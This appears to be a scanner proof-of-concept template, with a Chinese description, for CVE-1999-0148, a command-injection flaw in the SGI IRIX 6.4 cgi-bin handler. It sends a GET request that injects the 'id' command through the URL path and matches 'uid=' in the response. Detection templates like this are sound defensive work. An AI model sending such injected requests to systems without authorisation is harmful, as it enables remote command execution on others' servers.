[info]
author = "ave"
description = "SGI IRIX 6.4 的 cgi-bin handler 程序存在命令注入漏洞，远程攻击者可通过 HTTP GET 请求在 URL 路径中注入分号分隔的命令，以 Web 服务器权限执行任意系统命令。"
id = "POC-AVE-1999-0302"
name = "SGI IRIX 6.4 handler CGI RCE PoC"
severity = "high"
tags = ["ave-1999-0302"]
vuln_id = [
    "CVE-1999-0148",
    "AVE-1999-0302",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/handler/id"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
